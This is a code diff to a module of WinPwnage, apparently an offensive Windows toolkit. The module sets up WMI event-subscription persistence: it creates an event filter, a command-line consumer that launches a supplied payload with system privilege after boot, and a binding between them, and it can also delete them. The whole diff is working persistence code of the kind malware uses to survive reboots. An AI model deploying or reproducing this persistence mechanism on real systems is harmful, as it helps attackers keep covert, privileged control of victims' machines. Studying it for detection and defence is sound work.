@@ -1,11 +1,7 @@
-import os
 import time
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 
-# wmic /namespace:"\\root\subscription" PATH __EventFilter WHERE Name="WinPwnageFilter" DELETE
-# wmic /namespace:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="WinPwnageConsumer" DELETE
-# wmic /namespace:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="WinPwnageFilter"' DELETE
 
 wmic_info = {
 	"Description": "Gain persistence with system privilege using wmic",
@@ -19,33 +15,38 @@ wmic_info = {
 }
 
 
-def persist_wmic(payload):
-	if payloads().exe(payload):
-		if information().admin():
-			if process().create("wmic.exe", params="/namespace:'\\\\root\\subscription' PATH __EventFilter CREATE Name='WinPwnageFilter', EventNameSpace='root\\cimv2',QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''"):
-				print_success("Successfully created __EventFilter")
-			else:
-				print_error("Unable to create event filter")
-				return False
-
-			time.sleep(3)
-
-			if process().create("wmic.exe", params="/namespace:'\\\\root\\subscription' PATH CommandLineEventConsumer CREATE Name='WinPwnageConsumer', ExecutablePath='{}',CommandLineTemplate='{}'".format(os.path.join(payload),os.path.join(payload))):
-				print_success("Successfully created CommandLineEventConsumer")
-			else:
-				print_error("Unable to create CommandLineEventConsumer")
-				return False
-
-			time.sleep(3)
-
-			if process().create("wmic.exe", params="/namespace:'\\\\root\\subscription' PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name='WinPwnageFilter'', Consumer='CommandLineEventConsumer.Name='WinPwnageConsumer''"):
-				print_success("Successfully created __FilterToConsumerBinding")
-			else:
-				print_error("Unable to create __FilterToConsumerBinding")
-				return False
-		else:
-			print_error("Unable to proceed, we are not elevated")
-			return False
-	else:
-		print_error("Cannot proceed, invalid payload")
+def persist_wmic(payload, name='WinPwnage', add=True):
+	if not information().admin():
+		print_error("Cannot proceed, we are not elevated")
 		return False
+
+	cmds = {
+		'create': {
+			('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="{name}", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 360"'),
+			('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="{name}", ExecutablePath="{path}", CommandLineTemplate="{path}"'),
+			('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding CREATE Filter=\'__EventFilter.Name="{name}"\', Consumer=\'CommandLineEventConsumer.Name="{name}"\''),
+		},
+		'delete': {
+			('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter WHERE Name="{name}" DELETE'),
+			('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer WHERE Name="{name}" DELETE'),
+			('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding WHERE Filter=\'__EventFilter.Name="{name}"\' DELETE'),
+		}
+	}
+
+	if add:
+		if not payloads().exe(payload):
+			print_error("Cannot proceed, invalid payload")
+			return False
+
+		action = 'create'
+	else:
+		action = 'delete'
+
+	for i, cmd in cmds[action]:
+		exit_code = process().create('wmic.exe', params=cmd.format(name=name, path=payload), get_exit_code=True)
+		if exit_code == 0:
+			print_success("Successfully {action}d {event} (exit code: {code})".format(action=action, event=i, code=exit_code))
+		else:
+			print_error("Unable to {action} {event} (exit code: {code})".format(action=action, event=i, code=exit_code))
+
+		time.sleep(3)
